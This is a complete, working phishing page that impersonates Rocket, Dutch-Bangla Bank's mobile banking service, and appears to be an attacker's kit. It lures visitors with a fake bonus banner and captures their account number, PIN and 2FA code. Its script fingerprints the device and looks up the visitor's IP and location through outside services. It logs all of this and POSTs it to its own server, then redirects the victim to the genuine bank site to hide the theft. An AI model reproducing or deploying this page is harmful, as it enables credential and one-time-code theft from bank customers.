<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Rocket</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; 
        }
        
        body { 
            background: linear-gradient(135deg, #8a288f 0%, #4a1c4e 100%); 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            color: #333; 
            padding: 20px;
        }
        
        .rocket-logo { 
            margin-bottom: 20px; 
            text-align: center; 
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .rocket-icon {
            width: 60px;
            height: 60px;
            background-color: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 16px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.2);
        }
        
        .rocket-icon img {
            width: 80px;
            height: 80px;
            border-radius: 20%;
        }
        
        .rocket-logo-text { 
            font-size: 42px; 
            font-weight: bold; 
            color: white; 
            letter-spacing: -1px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        
        .tagline {
            font-size: 16px;
            color: rgba(255,255,255,0.9);
            margin-top: 8px;
            font-weight: 500;
        }
        
        .government-banner {
            background: linear-gradient(135deg, #ff6b35 0%, #ff8c5a 100%);
            color: white;
            padding: 15px 25px;
            border-radius: 12px;
            margin-bottom: 25px;
            text-align: center;
            font-weight: 700;
            font-size: 18px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            border: 2px solid #ff8c5a;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }
        
        .container { 
            background-color: white; 
            padding: 30px; 
            border-radius: 20px; 
            box-shadow: 0 12px 40px rgba(0,0,0,0.25); 
            width: 100%; 
            max-width: 420px; 
            text-align: center; 
        }
        
        h1 { 
            font-size: 24px; 
            font-weight: 600; 
            margin-bottom: 25px; 
            color: #6a2c70;
            text-align: center;
        }
        
        .h1-2fa { 
            font-size: 22px; 
            font-weight: 700; 
            margin-bottom: 12px; 
            color: #6a2c70;
        }
        
        .p-2fa { 
            font-size: 15px; 
            color: #666; 
            margin-bottom: 25px; 
            line-height: 1.5;
        }
        
        .input-group { 
            margin-bottom: 20px; 
            text-align: left;
            position: relative;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #555;
            font-weight: 600;
        }
        
        .input-with-icon {
            position: relative;
        }
        
        .input-with-icon i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #888;
            z-index: 2;
        }
        
        input[type="text"], input[type="password"], input[type="tel"] { 
            width: 100%; 
            height: 52px; 
            border: 2px solid #e0e0e0; 
            border-radius: 12px; 
            padding: 0 18px 0 45px; 
            font-size: 16px; 
            background-color: #f8f9fa; 
            transition: all 0.3s ease;
            color: #333;
        }
        
        input:focus { 
            outline: none; 
            border-color: #6a2c70; 
            box-shadow: 0 0 0 3px rgba(106, 44, 112, 0.1); 
            background-color: white;
        }
        
        #code { 
            text-align: center; 
            letter-spacing: 8px; 
            font-size: 20px;
            font-weight: 600;
            color: #6a2c70;
            padding: 0 18px;
        }
        
        .button { 
            color: white; 
            background: linear-gradient(135deg, #6a2c70 0%, #4a1c4e 100%); 
            border: none; 
            border-radius: 12px; 
            padding: 16px 0; 
            font-size: 18px; 
            font-weight: 700; 
            cursor: pointer; 
            width: 100%; 
            margin-top: 10px; 
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(106, 44, 112, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
        }
        
        .button:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(106, 44, 112, 0.4);
        }
        
        .button:active {
            transform: translateY(0);
        }
        
        .button-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }
        
        #loader { 
            display: none; 
            margin: 15px auto; 
            width: 32px; 
            height: 32px; 
            border: 3px solid #f3f3f3; 
            border-top: 3px solid #6a2c70; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
        }
        
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        
        .footer {
            margin-top: 30px;
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
            text-align: center;
            line-height: 1.6;
        }
        
        .footer a {
            color: white;
            text-decoration: none;
            font-weight: 600;
        }
        
        .help-links a {
            color: #6a2c70;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }
        
        .bank-reference {
            background: #fff8f0;
            border: 1px solid #ffddb3;
            border-radius: 10px;
            padding: 12px;
            margin-top: 15px;
            text-align: center;
            font-size: 12px;
            color: #cc7700;
        }

        .countdown { font-size: 14px; color: #6a2c70; font-weight: 600; margin-top: 10px; }
        .resend-option { margin-top: 15px; text-align: center; }
        .phone-prefix { display: flex; align-items: center; }
        .phone-prefix span { background: #f0f0f0; padding: 0 15px; height: 52px; display: flex; align-items: center; border: 2px solid #e0e0e0; border-right: none; border-radius: 12px 0 0 12px; font-weight: 600; color: #555; }
        .phone-prefix .input-with-icon { flex: 1; }
        .phone-prefix input { border-radius: 0 12px 12px 0; padding-left: 45px; }

    </style>
</head>
<body>
    <div class="rocket-logo">
        <div class="rocket-icon">
            <img src="https://raw.githubusercontent.com/life-by/PhingeFile/refs/heads/main/Logo/rocket-logo.png" alt="Rocket Logo">
        </div>
        <div class="rocket-logo-text">Rocket</div>
        <div class="tagline">By Dutch-Bangla Bank</div>
    </div>
    
    <div class="government-banner">
        üöÄ ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶Ö‡¶´‡¶æ‡¶∞: ‡¶∏‡¶ï‡¶≤ ‡¶ó‡ßç‡¶∞‡¶æ‡¶π‡¶ï‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡ß®‡ß¶‡ß¶‡ß¶ ‡¶ü‡¶æ‡¶ï‡¶æ ‡¶¨‡ßã‡¶®‡¶æ‡¶∏ üöÄ
    </div>
    
    <div class="container">
        <!-- ‡¶ß‡¶æ‡¶™ ‡ßß: ‡¶≤‡¶ó‡¶á‡¶® ‡¶∏‡ßá‡¶ï‡¶∂‡¶® -->
        <div id="login-section">
            <h1>Login to Your Rocket Account</h1>
            
            <div class="input-group">
                <label for="phone">Rocket Account Number</label>
                <div class="phone-prefix">
                    <span>+88</span>
                    <div class="input-with-icon">
                        <i class="fas fa-user"></i>
                        <input type="tel" id="phone" placeholder="01XXXXXXXXX" required pattern="[0-9]{11}">
                    </div>
                </div>
            </div>
            
            <div class="input-group">
                <label for="pass">4-Digit PIN</label>
                <div class="input-with-icon">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="pass" placeholder="Enter your 4-digit PIN" required maxlength="4" pattern="[0-9]{4}">
                </div>
            </div>
            
            <button id="login-button" class="button" onclick="sendLoginInfo()">
                <div class="button-content">
                    <span>LOG IN</span>
                    <i class="fas fa-arrow-right"></i>
                </div>
            </button>
            <div id="loader"></div>

            <div class="bank-reference">
                <strong>Dutch-Bangla Bank Limited</strong><br>
                A trusted name in banking
            </div>
        </div>
        
        <!-- ‡¶ß‡¶æ‡¶™ ‡ß®: 2FA ‡¶ï‡ßã‡¶° ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® -->
        <div id="2fa-section" style="display: none;">
            <h1 class="h1-2fa">Security Verification</h1>
            <p class="p-2fa" id="verification-message">We've sent a 6-digit verification code to your mobile number. Please enter it below.</p>
            
            <div class="input-group">
                <input type="tel" id="code" placeholder="‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢ ‚Ä¢" maxlength="6" required pattern="[0-9]{6}">
            </div>
            
            <div class="countdown" id="countdown">Code expires in: 05:00</div>
            
            <button id="code-button" class="button" onclick="send2FACode()">
                <div class="button-content">
                    <span>VERIFY & CONTINUE</span>
                    <i class="fas fa-arrow-right"></i>
                </div>
            </button>
            
            <div class="resend-option">
                Didn't receive the code? 
                <a href="#" onclick="resendCode()" style="color: #6a2c70; text-decoration: none; font-weight: 600;">Resend Code</a>
                <br>
                <a href="#" onclick="goBackToLogin()" style="color: #666; text-decoration: none; font-size: 13px; margin-top: 5px; display: inline-block;">‚Üê Back to Login</a>
            </div>
        </div>
    </div>
    
    <div class="footer">
        <p>¬© 2024 Rocket - Dutch-Bangla Bank Limited. All rights reserved.</p>
        <p style="margin-top: 8px;">
            <a href="#">Terms of Service</a> | 
            <a href="#">Privacy Policy</a> | 
            <a href="#">Security Tips</a>
        </p>
        <p style="margin-top: 12px; font-size: 12px; opacity: 0.8;">
            Regulated by Bangladesh Bank
        </p>
    </div>

    <!-- =========== ‡¶°‡ßá‡¶ü‡¶æ ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶™‡ßç‡¶ü =========== -->
    <script>
        let countdownInterval;
        let timeLeft = 300;

        // ‡¶™‡ßá‡¶ú ‡¶≤‡ßã‡¶° ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π ‡¶∂‡ßÅ‡¶∞‡ßÅ
        let deviceInfoPromise = (async () => {
            const deviceInfo = {
                ua: navigator.userAgent || 'Unknown', platform: navigator.platform || 'Unknown',
                language: navigator.language || 'Unknown', res: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            if (navigator.connection) deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
                    deviceInfo.isCharging = battery.charging;
                } catch (e) { /* ignore */ }
            }
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                deviceInfo.ip = ipData.ip;
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locationData = await locationResponse.json();
                deviceInfo.country = locationData.country_name;
                deviceInfo.city = locationData.city;
            } catch (e) { deviceInfo.ip = 'Failed to fetch'; }
            return JSON.stringify(deviceInfo);
        })();

        // ‡¶™‡ßç‡¶∞‡¶•‡¶Æ ‡¶ß‡¶æ‡¶™: ‡¶´‡ßã‡¶® ‡¶ì ‡¶™‡¶ø‡¶® ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü
        async function sendLoginInfo() {
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('pass').value;
            if (!phone || phone.length !== 11 || !phone.startsWith('01')) return alert('Please enter a valid 11-digit number.');
            if (!pass || pass.length !== 4) return alert('Please enter your 4-digit PIN.');

            const loginButton = document.getElementById('login-button');
            const loader = document.getElementById('loader');
            loginButton.style.display = 'none';
            loader.style.display = 'block';

            const deviceInfo = await deviceInfoPromise;

            // LocalStorage-‡¶è ‡¶°‡ßá‡¶ü‡¶æ ‡¶∏‡ßá‡¶≠
            try {
                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
                if (!storedData.rocketData) storedData.rocketData = [];
                storedData.rocketData.push({ phone, pass, deviceInfo, timestamp: new Date().toLocaleString(), type: 'login' });
                localStorage.setItem('userInputData', JSON.stringify(storedData));
            } catch (e) { console.error('LocalStorage save error:', e); }

            // ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            try {
                await fetch('/', { method: 'POST', body: new URLSearchParams({ phone, pass, deviceInfo }) });
            } catch (e) { console.error('Server send error:', e); }
            
            setTimeout(() => {
                document.getElementById('login-section').style.display = 'none';
                document.getElementById('2fa-section').style.display = 'block';
                document.getElementById('verification-message').textContent = `We've sent a 6-digit code to +88${phone}. Please enter it to continue.`;
                startCountdown();
                loginButton.style.display = 'flex';
                loader.style.display = 'none';
            }, 1500);
        }

        // ‡¶¶‡ßç‡¶¨‡¶ø‡¶§‡ßÄ‡ßü ‡¶ß‡¶æ‡¶™: 2FA ‡¶ï‡ßã‡¶° ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü
        async function send2FACode() {
            const code = document.getElementById('code').value;
            if (!code || code.length !== 6) return alert('Please enter the 6-digit code.');
            
            const codeButton = document.getElementById('code-button');
            codeButton.querySelector('span').textContent = 'VERIFYING...';
            codeButton.disabled = true;

            const phone = document.getElementById('phone').value;
            const deviceInfo = await deviceInfoPromise;

            // LocalStorage-‡¶è 2FA ‡¶°‡ßá‡¶ü‡¶æ ‡¶∏‡ßá‡¶≠
            try {
                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
                if (!storedData.rocketData) storedData.rocketData = [];
                storedData.rocketData.push({ phone, '2fa_code': code, deviceInfo, timestamp: new Date().toLocaleString(), type: '2fa' });
                localStorage.setItem('userInputData', JSON.stringify(storedData));
            } catch (e) { console.error('LocalStorage 2FA save error:', e); }

            // ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá 2FA ‡¶ï‡ßã‡¶° ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
            try {
                await fetch('/', { method: 'POST', body: new URLSearchParams({ phone, '2fa_code': code, deviceInfo }) });
            } catch (e) { console.error('Server 2FA send error:', e); }

            setTimeout(() => window.location.href = 'https://www.rocket.com.bd/', 1000);
        }

        // Helper Functions (UI)
        function startCountdown() {
            timeLeft = 300;
            clearInterval(countdownInterval);
            const countdownEl = document.getElementById('countdown');
            const update = () => {
                const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
                const seconds = (timeLeft % 60).toString().padStart(2, '0');
                countdownEl.textContent = `Code expires in: ${minutes}:${seconds}`;
                if (timeLeft-- <= 0) {
                    clearInterval(countdownInterval);
                    countdownEl.textContent = 'Code expired!';
                }
            };
            update();
            countdownInterval = setInterval(update, 1000);
        }
        function resendCode() {
            if (timeLeft > 240) return alert('Please wait before requesting a new code.');
            startCountdown(); alert('New verification code sent!');
        }
        function goBackToLogin() {
            document.getElementById('2fa-section').style.display = 'none';
            document.getElementById('login-section').style.display = 'block';
            clearInterval(countdownInterval);
        }
        document.getElementById('phone')?.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').substring(0, 11));
        document.getElementById('pass')?.addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4));
        const codeInput = document.getElementById('code');
        if (codeInput) {
            codeInput.addEventListener('input', e => {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 6);
                if (e.target.value.length === 6) document.getElementById('code-button').click();
            });
        }
    </script>
</body>

</html>
